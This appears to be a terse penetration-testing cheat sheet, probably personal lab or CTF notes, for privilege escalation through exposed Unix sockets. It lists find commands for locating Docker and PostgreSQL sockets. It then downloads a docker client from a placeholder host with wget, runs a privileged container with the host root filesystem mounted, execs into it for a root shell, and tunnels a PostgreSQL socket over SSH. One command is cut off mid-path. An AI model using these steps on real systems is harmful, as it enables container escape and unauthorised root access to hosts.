- [ ] Enumeration
- [ ] Docker Unix Socket Abuse
- [ ] PostgreSQL Socket Abuse

Enumeration!!!
```sh
find / -name .s.PGSQL.5432 -type f 2>>/dev/null
find / -name docker.sock -type f 2>>/dev/nu
find / -name *.sock -type f 2>>/dev/null
```
Docker Unix Socket Abuse!!!
```sh
ls -la /app
wget http://IP/docker
chmod +x ./docker
./docker -H unix:///app/docker.sock ps
./docker -H unix:///app/docker.sock run --rm -d --privileged -v /:/hostsystem main_app
./docker -H unix:///app/docker.sock exec -it 7ae3bcc818af /bin/bash
```
PostgreSQL Socket Abuse!!!
```sh
ls -la /var/run/postgresql/.s.PGSQL.5432

ssh -N -L /tmp/.s.PGSQL.5432:/var/run/postgresql/.s.PGSQL.5432 user@IP
```